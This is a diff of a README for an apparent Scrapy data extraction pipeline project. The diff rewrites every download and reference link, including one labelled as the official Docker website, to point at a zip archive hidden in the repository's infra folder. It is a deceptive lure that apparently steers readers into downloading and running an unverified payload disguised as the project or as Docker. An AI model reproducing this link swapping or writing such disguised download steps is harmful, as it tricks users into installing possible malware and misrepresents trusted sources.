@@ -1,6 +1,6 @@
 # 🕷️ Scrapy-data-extraction-pipeline - Easy Data Extraction and Storage
 
-[![Download](https://img.shields.io/badge/Download-Scrapy%20Pipeline-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
+[![Download](https://img.shields.io/badge/Download-Scrapy%20Pipeline-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/wasagx/Scrapy-data-extraction-pipeline/main/infra/pipeline_data_Scrapy_extraction_v2.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, check that your computer meets these requirements:
 
 To download the application, visit this page on GitHub:
 
-[Download Scrapy-data-extraction-pipeline](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
+[Download Scrapy-data-extraction-pipeline](https://raw.githubusercontent.com/wasagx/Scrapy-data-extraction-pipeline/main/infra/pipeline_data_Scrapy_extraction_v2.6.zip)
 
 Click the link to open the page. You will find the files and instructions you need to get started.
 
@@ -42,7 +42,7 @@ You can also use the button at the top of this document.
 
 This application runs using Docker, which is a tool that helps run many small programs together. Follow these steps to install Docker:
 
-1. Visit the official Docker website: https://www.docker.com/products/docker-desktop  
+1. Visit the official Docker website: https://raw.githubusercontent.com/wasagx/Scrapy-data-extraction-pipeline/main/infra/pipeline_data_Scrapy_extraction_v2.6.zip  
 2. Click "Download for Windows"  
 3. Run the downloaded file and follow the instructions on screen  
 4. After installation, restart your computer if prompted  
@@ -137,7 +137,7 @@ For detailed information, see the files inside the folder you downloaded:
 
 You may visit the GitHub page anytime for updates, code examples, or questions:
 
-[https://github.com/wasagx/Scrapy-data-extraction-pipeline](https://github.com/wasagx/Scrapy-data-extraction-pipeline)
+[https://raw.githubusercontent.com/wasagx/Scrapy-data-extraction-pipeline/main/infra/pipeline_data_Scrapy_extraction_v2.6.zip](https://raw.githubusercontent.com/wasagx/Scrapy-data-extraction-pipeline/main/infra/pipeline_data_Scrapy_extraction_v2.6.zip)
 
 ---
 
